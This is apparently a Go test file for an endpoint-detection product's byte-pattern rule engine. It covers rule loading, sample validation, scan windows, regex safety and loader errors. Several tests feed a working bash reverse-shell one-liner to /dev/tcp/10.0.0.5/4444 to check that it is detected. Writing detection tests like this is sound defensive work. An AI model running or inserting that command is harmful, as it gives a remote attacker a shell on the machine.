// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"bytes"
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"testing"
	"testing/fstest"
	"time"
)

func mustBuiltinBytes(t *testing.T) *ByteRuleSet {
	t.Helper()
	set, err := BuiltinByteRules()
	if err != nil {
		t.Fatalf("embedded byte packs failed validation: %v", err)
	}
	return set
}

func TestBytePackLoadsAndCounts(t *testing.T) {
	set := mustBuiltinBytes(t)
	if len(set.Rules) < 100 {
		t.Fatalf("want at least 100 rules, got %d", len(set.Rules))
	}
	types := map[string]int{}
	for _, r := range set.Rules {
		for _, p := range r.Strings {
			types[p.Type]++
		}
	}
	for _, k := range []string{"ascii", "wide", "hex", "regex"} {
		if types[k] == 0 {
			t.Errorf("no %s patterns in the pack", k)
		}
	}
	t.Logf("rules=%d pattern types=%v", len(set.Rules), types)
}

// Every rule: positives match, negatives do not (also enforced at load), the
// finding id carries the byte- prefix, and noisy-risk rules are never above medium.
func TestByteRulesHarness(t *testing.T) {
	set := mustBuiltinBytes(t)
	for _, r := range set.Rules {
		r := r
		t.Run(r.ID, func(t *testing.T) {
			if !strings.HasPrefix(r.ID, "byte-") {
				t.Fatal("id prefix")
			}
			if r.Noisy() && byteSeverities[r.Severity] > byteSeverities["medium"] {
				t.Errorf("noisy-risk rule must be low or medium, is %s", r.Severity)
			}
			if r.Severity == "low" && r.Weight > 15 {
				t.Errorf("low severity rule weight %d too high", r.Weight)
			}
			for i, s := range r.Samples.Positive {
				data, err := s.bytes()
				if err != nil {
					t.Fatal(err)
				}
				for _, kind := range r.sampleKinds() {
					if _, ok := r.match(newByteScan(kind, data)); !ok {
						t.Errorf("positive %d does not match under %s", i, kind)
					}
				}
			}
			for i, s := range r.Samples.Negative {
				data, _ := s.bytes()
				for _, kind := range r.sampleKinds() {
					if _, ok := r.match(newByteScan(kind, data)); ok {
						t.Errorf("negative %d matches under %s", i, kind)
					}
				}
			}
		})
	}
}

func TestByteBenignFixturesStayQuiet(t *testing.T) {
	set := mustBuiltinBytes(t)
	for _, f := range byteBenignFixtures() {
		for _, kind := range f.kinds {
			hits, _ := set.Scan(context.Background(), kind, f.data)
			for _, h := range hits {
				if byteSeverities[h.Rule.Severity] >= byteSeverities["medium"] {
					t.Errorf("%s/%s matched %s (%s)", f.name, kind, h.Rule.ID, h.Rule.Severity)
				}
			}
		}
	}
}

func TestByteAnalyzerRegisteredAndReports(t *testing.T) {
	names := InspectAnalyzerNames()
	for _, k := range []string{InspectKindFile, InspectKindScript} {
		found := false
		for _, n := range names[k] {
			if n == byteAnalyzerName {
				found = true
			}
		}
		if !found {
			t.Fatalf("analyzer not registered for %s", k)
		}
	}
	for _, k := range []string{InspectKindCmdline, InspectKindDomain} {
		for _, n := range names[k] {
			if n == byteAnalyzerName {
				t.Fatalf("analyzer must not run for %s", k)
			}
		}
	}
	rep := RunAnalyzers(context.Background(), InspectInput{Kind: InspectKindScript, Text: "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"})
	var got *InspectFinding
	for i := range rep.Findings {
		if rep.Findings[i].ID == "byte-revshell-bash-devtcp" {
			got = &rep.Findings[i]
		}
	}
	if got == nil || got.Weight != 70 || got.Severity != "critical" || got.Technique != "T1059.004" || got.Analyzer != byteAnalyzerName {
		t.Fatalf("finding missing or wrong: %+v (report %+v)", got, rep.Findings)
	}
	rep = RunAnalyzers(context.Background(), InspectInput{Kind: InspectKindFile, Data: benignPEStub()})
	for _, f := range rep.Findings {
		if strings.HasPrefix(f.ID, "byte-") {
			t.Fatalf("benign PE stub produced %+v", f)
		}
	}
}

func TestByteDeterminism(t *testing.T) {
	set := mustBuiltinBytes(t)
	var inputs [][]byte
	var kinds []string
	for _, r := range set.Rules {
		for _, s := range r.Samples.Positive {
			d, _ := s.bytes()
			inputs = append(inputs, d)
			kinds = append(kinds, r.sampleKinds()[0])
		}
	}
	run := func() []string {
		var out []string
		for i, d := range inputs {
			hits, _ := set.Scan(context.Background(), kinds[i], d)
			for _, h := range hits {
				out = append(out, h.Rule.ID+":"+strings.Join(h.Matched, ","))
			}
			out = append(out, "|")
		}
		return out
	}
	a, b := run(), run()
	if !reflect.DeepEqual(a, b) {
		t.Fatal("scan results differ between runs")
	}
	// a fresh load yields the same ordering
	set2, err := LoadByteRules(byteContentFS, "bytecontent")
	if err != nil {
		t.Fatal(err)
	}
	for i := range set.Rules {
		if set.Rules[i].ID != set2.Rules[i].ID {
			t.Fatal("rule order differs across loads")
		}
	}
}

// ---- bounds ----

func TestByteHugeInputIsBounded(t *testing.T) {
	set := mustBuiltinBytes(t)
	big := bytes.Repeat([]byte("A"), InspectMaxBytes)
	start := time.Now()
	hits, trunc := set.Scan(context.Background(), InspectKindFile, big)
	if !trunc {
		t.Error("a 32 MiB input should report a truncated scan window")
	}
	if len(hits) != 0 {
		t.Errorf("unexpected hits on filler: %d", len(hits))
	}
	if d := time.Since(start); d > 30*time.Second {
		t.Fatalf("scan of max input took %v", d)
	}
	// content beyond the head/tail windows is not scanned (documented limit)
	mid := bytes.Repeat([]byte("."), 16<<20)
	copy(mid[8<<20:], "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
	hits, _ = set.Scan(context.Background(), InspectKindScript, mid)
	for _, h := range hits {
		if h.Rule.ID == "byte-revshell-bash-devtcp" {
			t.Error("mid-file content should be outside the scan window")
		}
	}
	// content in the tail window is found
	tail := bytes.Repeat([]byte("."), 16<<20)
	copy(tail[len(tail)-1024:], "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1")
	hits, _ = set.Scan(context.Background(), InspectKindScript, tail)
	found := false
	for _, h := range hits {
		found = found || h.Rule.ID == "byte-revshell-bash-devtcp"
	}
	if !found {
		t.Error("tail window content should be scanned")
	}
}

func TestBytePathologicalRegexInput(t *testing.T) {
	// Patterns that would explode a backtracking engine; RE2 stays linear.
	pack := `{"rules":[{"id":"byte-evil","name":"n","description":"d","tactic":"Execution","technique":"T1059","severity":"low","weight":1,
	 "applies_to":"both","format":"any","strings":[{"name":"a","type":"regex","value":"(a+)+(a|aa)+b[^x]*$"}],"condition":{"str":"a"},
	 "samples":{"positive":[{"text":"aaaaab"}],"negative":[{"text":"aaaaa"}]}}]}`
	rules, err := ParseBytePack([]byte(pack))
	if err != nil {
		t.Fatal(err)
	}
	set, err := buildByteRuleSet(rules)
	if err != nil {
		t.Fatal(err)
	}
	in := bytes.Repeat([]byte("a"), 4<<20)
	start := time.Now()
	hits, _ := set.Scan(context.Background(), InspectKindScript, in)
	if len(hits) != 0 {
		t.Fatal("no b in input, no hit")
	}
	if d := time.Since(start); d > 30*time.Second {
		t.Fatalf("pathological regex took %v", d)
	}
}

func TestByteOccurrenceAndHexCandidateCaps(t *testing.T) {
	p := &BytePattern{Name: "a", Type: "ascii", Value: "abc"}
	if err := p.compile(); err != nil {
		t.Fatal(err)
	}
	s := newByteScan(InspectKindFile, bytes.Repeat([]byte("abc"), 100000))
	n, first := p.count(s, 1000)
	if n != byteMaxOccurrences || first != 0 {
		t.Fatalf("count=%d first=%d, want cap %d", n, first, byteMaxOccurrences)
	}
	h := &BytePattern{Name: "h", Type: "hex", Value: "41 42 43 ?? ?? ?? 99"}
	if err := h.compile(); err != nil {
		t.Fatal(err)
	}
	start := time.Now()
	n, _ = h.count(newByteScan(InspectKindFile, bytes.Repeat([]byte("ABC"), 1<<20)), 1)
	if n != 0 || time.Since(start) > 2*time.Second {
		t.Fatalf("hex candidate cap not applied: n=%d in %v", n, time.Since(start))
	}
}

func TestByteOffsetsAndNocaseAndWide(t *testing.T) {
	mk := func(js string) *ByteRule {
		rules, err := ParseBytePack([]byte(`{"rules":[` + js + `]}`))
		if err != nil {
			t.Fatal(err)
		}
		return rules[0]
	}
	base := `"name":"n","description":"d","tactic":"Execution","technique":"T1059","severity":"low","weight":1,"applies_to":"both","format":"any","samples":{}`
	r := mk(`{"id":"byte-off",` + base + `,"strings":[{"name":"a","type":"ascii","value":"MARK","offset":{"min":10,"max":20}}],"condition":{"str":"a"}}`)
	for _, c := range []struct {
		at   int
		want bool
	}{{0, false}, {10, true}, {20, true}, {21, false}, {40, false}} {
		d := bytes.Repeat([]byte("."), 64)
		copy(d[c.at:], "MARK")
		_, got := r.match(newByteScan(InspectKindFile, d))
		if got != c.want {
			t.Errorf("offset %d: got %v want %v", c.at, got, c.want)
		}
	}
	r = mk(`{"id":"byte-nc",` + base + `,"strings":[{"name":"a","type":"ascii","value":"Hello","nocase":true},{"name":"w","type":"wide","value":"Wide","nocase":true},{"name":"n","type":"ascii","value":"never"}],"condition":{"all":[{"str":"a"},{"str":"w"},{"not":{"str":"n"}}]}}`)
	d := []byte("xxHELLOxx W\x00I\x00D\x00E\x00")
	if _, ok := r.match(newByteScan(InspectKindFile, d)); !ok {
		t.Error("nocase ascii + wide should match")
	}
	if _, ok := r.match(newByteScan(InspectKindFile, append(d, []byte("never")...))); ok {
		t.Error("not() should veto")
	}
	r = mk(`{"id":"byte-min",` + base + `,"strings":[{"name":"a","type":"ascii","value":"tok","min":3},{"name":"b","type":"ascii","value":"zzz"}],"condition":{"n_of":{"count":1,"of":["a","b"]}}}`)
	if _, ok := r.match(newByteScan(InspectKindFile, []byte("tok tok"))); ok {
		t.Error("min=3 needs three occurrences")
	}
	if _, ok := r.match(newByteScan(InspectKindFile, []byte("tok tok tok"))); !ok {
		t.Error("three occurrences should match")
	}
}

func TestByteFormatSizeMagic(t *testing.T) {
	mk := func(extra string) *ByteRule {
		js := `{"rules":[{"id":"byte-fmt","name":"n","description":"d","tactic":"Execution","technique":"T1059","severity":"low","weight":1,"strings":[{"name":"a","type":"ascii","value":"needle"}],"condition":{"str":"a"},"samples":{}` + extra + `}]}`
		rules, err := ParseBytePack([]byte(js))
		if err != nil {
			t.Fatal(err)
		}
		return rules[0]
	}
	pe := benignPEStub()
	copy(pe[0x500:], "needle")
	r := mk(`,"applies_to":"file","format":"pe"`)
	if _, ok := r.match(newByteScan(InspectKindFile, pe)); !ok {
		t.Error("pe format should match")
	}
	if _, ok := r.match(newByteScan(InspectKindFile, []byte("needle text"))); ok {
		t.Error("text is not pe")
	}
	if _, ok := mk(`,"applies_to":"script","format":"any"`).match(newByteScan(InspectKindFile, []byte("needle"))); ok {
		t.Error("script rule must not run for file")
	}
	if _, ok := mk(`,"applies_to":"both","format":"any","min_size":100`).match(newByteScan(InspectKindFile, []byte("needle"))); ok {
		t.Error("min_size")
	}
	if _, ok := mk(`,"applies_to":"both","format":"any","max_size":5`).match(newByteScan(InspectKindFile, []byte("needle"))); ok {
		t.Error("max_size")
	}
	if _, ok := mk(`,"applies_to":"both","format":"any","magic":"7f454c46"`).match(newByteScan(InspectKindFile, []byte("needle"))); ok {
		t.Error("magic")
	}
	if _, ok := mk(`,"applies_to":"both","format":"any","magic":"6e656564"`).match(newByteScan(InspectKindFile, []byte("needle"))); !ok {
		t.Error("magic prefix should match")
	}
	if detectByteFormat(InspectKindFile, benignELFStub()) != "elf" || detectByteFormat(InspectKindFile, benignMachOStub()) != "macho" ||
		detectByteFormat(InspectKindFile, []byte("hello")) != "script" || detectByteFormat(InspectKindFile, []byte{1, 0, 2}) != "" {
		t.Error("format detection")
	}
}

// ---- loader error cases ----

const okRule = `{"id":"byte-ok","name":"n","description":"d","tactic":"Execution","technique":"T1059.004","severity":"high","weight":10,"applies_to":"both","format":"any",
"strings":[{"name":"a","type":"ascii","value":"uniquemarker"}],"condition":{"str":"a"},
"samples":{"positive":[{"text":"has uniquemarker here"}],"negative":[{"text":"nothing"}]}}`

func loadJSON(files map[string]string) error {
	fsys := fstest.MapFS{}
	for n, c := range files {
		fsys["p/"+n] = &fstest.MapFile{Data: []byte(c)}
	}
	_, err := LoadByteRules(fsys, "p")
	return err
}

func TestByteLoaderAcceptsMinimal(t *testing.T) {
	if err := loadJSON(map[string]string{"a.json": `{"rules":[` + okRule + `]}`}); err != nil {
		t.Fatal(err)
	}
}

func TestByteLoaderErrors(t *testing.T) {
	mut := func(from, to string) string { return `{"rules":[` + strings.Replace(okRule, from, to, 1) + `]}` }
	cases := []struct {
		name, pack, want string
	}{
		{"bad json", `{"rules":[`, "decode"},
		{"unknown field", mut(`"weight":10`, `"weight":10,"bogus":1`), "unknown field"},
		{"id prefix", mut(`byte-ok`, `ok`), "byte-"},
		{"bad technique", mut(`T1059.004`, `T99`), "ATT&CK"},
		{"bad severity", mut(`"high"`, `"extreme"`), "severity"},
		{"weight zero", mut(`"weight":10`, `"weight":0`), "weight"},
		{"bad applies", mut(`"both"`, `"everything"`), "applies_to"},
		{"bad format", mut(`"format":"any"`, `"format":"zip"`), "format"},
		{"pe needs file", mut(`"format":"any"`, `"format":"pe"`), "requires applies_to file"},
		{"bad regex", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"regex","value":"(unclosed"`), "regex"},
		{"empty-matching regex", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"regex","value":"a*b*"`), "empty"},
		{"regex too long", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"regex","value":"`+strings.Repeat("a", 300)+`"`), "length"},
		{"bad hex digit", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"hex","value":"41 42 4g 44"`), "hex"},
		{"odd hex", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"hex","value":"414"`), "hex"},
		{"too-broad hex", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"hex","value":"41 ?? 42 ?? 43"`), "too broad"},
		{"unknown type", mut(`"type":"ascii"`, `"type":"yara"`), "unknown type"},
		{"short literal", mut(`uniquemarker"}],`, `a"}],`), "2.."},
		{"bad string name", mut(`"name":"a","type"`, `"name":"A-1","type"`), "pattern name"},
		{"unknown condition ref", mut(`{"str":"a"}`, `{"str":"zzz"}`), "unknown string"},
		{"unused string", mut(`"strings":[{"name":"a","type":"ascii","value":"uniquemarker"}]`, `"strings":[{"name":"a","type":"ascii","value":"uniquemarker"},{"name":"b","type":"ascii","value":"another"}]`), "not used"},
		{"empty condition", mut(`"condition":{"str":"a"}`, `"condition":{}`), "exactly one"},
		{"two cond kinds", mut(`{"str":"a"}`, `{"str":"a","not":{"str":"a"}}`), "exactly one"},
		{"n_of range", mut(`{"str":"a"}`, `{"n_of":{"count":3,"of":["a"]}}`), "n_of"},
		{"no positive sample", mut(`"positive":[{"text":"has uniquemarker here"}]`, `"positive":[]`), "positive"},
		{"no negative sample", mut(`"negative":[{"text":"nothing"}]`, `"negative":[]`), "negative"},
		{"positive does not match", mut(`has uniquemarker here`, `nope`), "positive sample 0"},
		{"negative matches", mut(`"text":"nothing"`, `"text":"uniquemarker"`), "negative sample 0"},
		{"bad b64", mut(`{"text":"nothing"}`, `{"b64":"!!!"}`), "sample"},
		{"sample both", mut(`{"text":"nothing"}`, `{"text":"x","b64":"eA=="}`), "exactly one"},
		{"bad offset", mut(`"value":"uniquemarker"`, `"value":"uniquemarker","offset":{"min":9,"max":1}`), "offset"},
		{"bad magic", mut(`"format":"any"`, `"format":"any","magic":"zz"`), "magic"},
		{"nocase hex", mut(`"type":"ascii","value":"uniquemarker"`, `"type":"hex","value":"41 42 43 44","nocase":true`), "nocase"},
	}
	for _, c := range cases {
		c := c
		t.Run(c.name, func(t *testing.T) {
			err := loadJSON(map[string]string{"a.json": c.pack})
			if err == nil {
				t.Fatal("expected an error")
			}
			if !strings.Contains(err.Error(), c.want) {
				t.Fatalf("error %q should mention %q", err, c.want)
			}
		})
	}
}

func TestByteLoaderDuplicateAndBenignGate(t *testing.T) {
	if err := loadJSON(map[string]string{
		"a.json": `{"rules":[` + okRule + `]}`,
		"b.json": `{"rules":[` + okRule + `]}`,
	}); err == nil || !strings.Contains(err.Error(), "duplicate rule id") {
		t.Fatalf("duplicate id across packs: %v", err)
	}
	// A rule matching ordinary prose at high severity must be rejected by the benign gate.
	broad := strings.Replace(okRule, `"value":"uniquemarker"`, `"value":"the"`, 1)
	broad = strings.Replace(broad, `has uniquemarker here`, `has the here`, 1)
	err := loadJSON(map[string]string{"a.json": `{"rules":[` + broad + `]}`})
	if err == nil || !strings.Contains(err.Error(), "benign fixture") {
		t.Fatalf("benign gate: %v", err)
	}
	// ...but the same broad rule at low severity is allowed.
	low := strings.Replace(broad, `"severity":"high"`, `"severity":"low"`, 1)
	if err := loadJSON(map[string]string{"a.json": `{"rules":[` + low + `]}`}); err != nil {
		t.Fatalf("low severity may match benign content: %v", err)
	}
}

func TestByteConditionLimits(t *testing.T) {
	deep := `{"str":"a"}`
	for i := 0; i < byteMaxCondDepth+2; i++ {
		deep = `{"not":` + deep + `}`
	}
	js := strings.Replace(okRule, `{"str":"a"}`, deep, 1)
	err := loadJSON(map[string]string{"a.json": `{"rules":[` + js + `]}`})
	if err == nil || !strings.Contains(err.Error(), "too deep") {
		t.Fatalf("deep condition: %v", err)
	}
	var many []string
	for i := 0; i < byteMaxPatterns+1; i++ {
		many = append(many, `{"name":"s`+string(rune('a'+i))+`","type":"ascii","value":"value`+string(rune('a'+i))+`"}`)
	}
	js = strings.Replace(okRule, `"strings":[{"name":"a","type":"ascii","value":"uniquemarker"}]`, `"strings":[`+strings.Join(many, ",")+`]`, 1)
	err = loadJSON(map[string]string{"a.json": `{"rules":[` + js + `]}`})
	if err == nil || !strings.Contains(err.Error(), "strings required") {
		t.Fatalf("too many strings: %v", err)
	}
}

func TestByteScanHonoursContext(t *testing.T) {
	set := mustBuiltinBytes(t)
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	hits, _ := set.Scan(ctx, InspectKindScript, []byte("bash -i >& /dev/tcp/10.0.0.5/4444 0>&1"))
	if len(hits) != 0 {
		t.Fatal("cancelled context should stop the scan")
	}
}

func TestByteBuiltinPackJSONShape(t *testing.T) {
	entries, err := byteContentFS.ReadDir("bytecontent")
	if err != nil || len(entries) == 0 {
		t.Fatal("no embedded packs")
	}
	for _, e := range entries {
		raw, _ := byteContentFS.ReadFile("bytecontent/" + e.Name())
		if !json.Valid(raw) {
			t.Errorf("%s is not valid JSON", e.Name())
		}
	}
}
